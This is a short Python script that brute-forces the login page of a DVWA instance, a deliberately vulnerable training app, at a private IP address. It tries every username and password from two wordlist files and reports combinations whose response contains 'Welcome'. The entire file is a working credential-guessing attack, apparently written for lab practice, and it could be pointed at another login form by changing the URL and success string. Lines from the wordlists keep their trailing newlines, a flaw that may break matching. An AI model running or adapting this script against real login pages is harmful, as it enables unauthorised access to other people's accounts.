import requests
file1 = open("username.txt","r")
file2 = open("password.txt","r")
url = "http://192.168.43.132/dvwa/login.php"
r = requests.session()
for username in file1:
	for password in file2:
		params = {
			'username' : username,
			'password' : password,
			'Login'    : 'Login'
		}
		out = r.post(url = url, data=params)
		if "Welcome" not in out.text:
			print("\033[1;31;40m[*] Invalid combination")
			
			
		else:
			print("\033[1;32;40m [+] Valid combination found!")
			print("username :" + username + "\n" +"Password :" + password)
	file2.seek(0)
